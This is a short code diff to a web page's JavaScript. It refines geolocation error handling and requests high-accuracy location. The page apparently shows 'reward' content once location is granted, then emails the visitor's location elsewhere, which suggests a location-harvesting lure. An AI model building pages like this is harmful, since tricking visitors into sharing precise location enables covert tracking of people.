@@ -66,10 +66,11 @@
                         document.getElementById("rewardContent").style.display = "block";
                     },
                     (error) => {
-                        console.error("❌ Location error:", error);
+                        console.error("❌ Location error:", error.message);
                         document.getElementById("locationDisplay").textContent = 
-                            "⚠️ Location access denied!";
-                    }
+                            "⚠️ Location access denied or unavailable!";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
                 console.log("❌ Geolocation not supported.");
@@ -90,7 +91,7 @@
                     document.getElementById("locationDisplay").textContent = "📧 Location sent!";
                 })
                 .catch((error) => {
-                    console.error("❌ Email sending error:", error);
+                    console.error("❌ Email sending error:", error.message);
                     document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
                 });
         }
